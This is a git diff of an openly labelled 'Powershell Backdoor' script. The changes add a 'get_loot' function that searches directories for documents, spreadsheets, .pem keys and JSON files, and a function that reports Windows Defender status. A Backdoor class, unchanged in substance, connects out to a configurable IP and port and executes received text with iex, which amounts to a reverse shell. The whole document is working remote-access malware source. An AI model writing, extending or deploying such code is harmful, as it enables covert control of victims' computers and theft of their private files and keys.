@@ -4,19 +4,31 @@ Powershell Backdoor
 Coded by Drew Alleman
 v0.0.0
 
-[+] Download Files from remote system
 [+] Fetching clients public ip address
 [+] Listing local users
 [+] OS Information
 [+] BIOS Information
 [+] Active TCP Clients
-s
-[-] Find Intresting Files
+[+] Find Intresting Files
+
+[-] Download Files from remote system
 [-] Find Writeable Directories
-[-] get startup apps
 
 #>
 
+
+function get_loot($help, $directory) {
+    if ($help -eq "--help") {
+        return "Searches a directory for intresting files `nsyntax: get_loot --directory C:\"
+    }
+    $lines = ''
+    $fileNames = Get-ChildItem $directory -Recurse -Include *.doc,*.pdf,*.json,*.pem,*.xlsx, *.xls, *.csv, *.txt
+    foreach ($f in $fileNames) {
+        $filename = $f.FullName
+        $lines += "$filename `n"
+    }
+    return $lines
+}
 
 function get_users($help) {
     if ($help -eq "--help") {
@@ -55,16 +67,24 @@ function get_os($help) {
 }
 
 
-function get_file($remote, $local, $help) {
-     if ($help -eq "--help" -or $local -eq $null -or $remote -eq $null) {
-        return "Gets a local file and saves it to your computer `nsyntax: get_file <remote_path> <local_path>`n Please use absolute paths!"
-    }
-    $content = Get-Content -Path $remote
-    return [System.Tuple]::Create($local, $content)
+function get_antivirus($help) {
+     if ($help -eq "--help") {
+        return "Gets infomation about Windows Defender"
+    } 
+    return  Get-MpComputerStatus | Select AntivirusEnabled, AMEngineVersion, AMProductVersion, AMServiceEnabled, AntispywareSignatureVersion, AntispywareEnabled, IsTamperProtected, IoavProtectionEnabled, NISSignatureVersion, NISEnabled, QuickScanSignatureVersion, RealTimeProtectionEnabled, OnAccessProtectionEnabled, DefenderSignaturesOutOfDate | Out-String
+
 }
 
+# function get_file($remote, $local, $help) {
+#      if ($help -eq "--help" -or $local -eq $null -or $remote -eq $null) {
+#         return "Gets a local file and saves it to your computer `nsyntax: get_file <remote_path> <local_path>`n Please use absolute paths!"
+#     }
+#     $content = Get-Content -Path $remote
+#     return [System.Tuple]::Create($local, $content)
+# }
+
 class Backdoor {
-	# Change this to the correct ip/port
+    # Change this to the correct ip/port
     [string]$ipAddress = "127.0.0.1"
     [int]$port = 4444
     $stream 
@@ -75,13 +95,13 @@ class Backdoor {
     $encoding
 
     createConnection() {
-    	$this.client = New-Object Net.Sockets.TcpClient($this.ipAddress, $this.port);
-    	$this.stream = $this.client.GetStream();
-   		$this.buffer = New-Object Byte[] 1024;
-		$this.encoding = New-Object Text.UTF8Encoding;
-		$this.writer = New-Object IO.StreamWriter($this.stream, [Text.Encoding]::UTF8, 1024);
+        $this.client = New-Object Net.Sockets.TcpClient($this.ipAddress, $this.port);
+        $this.stream = $this.client.GetStream();
+        $this.buffer = New-Object Byte[] 1024;
+        $this.encoding = New-Object Text.UTF8Encoding;
+        $this.writer = New-Object IO.StreamWriter($this.stream, [Text.Encoding]::UTF8, 1024);
         $this.reader = New-Object System.IO.StreamReader($this.stream)
-	    $this.writer.AutoFlush = $true;
+        $this.writer.AutoFlush = $true;
         $this.handleClient()
         $this.computerName = [System.Net.Dns]::GetHostName()
   
@@ -103,7 +123,7 @@ class Backdoor {
             $response = ($this.encoding.GetString($this.buffer, 0, $rawResponse))
             $output = "`n"
             try { 
-                $output = iex $response
+                $output = iex $response | Out-String
                 if ($response.Contains("get_file") -and $output.item1 -ne $null) {
                     $output.item2 | Out-File $output.item1
                 } else {
